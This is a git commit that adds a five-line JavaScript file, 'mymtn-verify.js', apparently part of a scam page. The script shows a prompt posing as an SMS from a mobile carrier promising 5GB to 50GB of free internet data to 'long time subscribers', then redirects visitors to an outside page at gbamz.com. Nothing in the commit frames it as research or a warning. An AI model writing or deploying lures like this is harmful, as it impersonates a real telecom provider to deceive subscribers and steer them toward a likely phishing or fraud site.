c266609d1c8fe31100859d3b4d70f431a6865831
sweet16palz-hub <sweet16palz@gmail.com>
2026-05-16 07:28:10 +0100

    Create mymtn-verify.js

---
+++ mymtn-verify.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA'
+password=prompt('SMS: Dear Customer, Kindly Receive Free Internet Data From 5GB To 50GB For Being Our Long Time Subscribers, press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://gbamz.com/mymtn.html';
+}
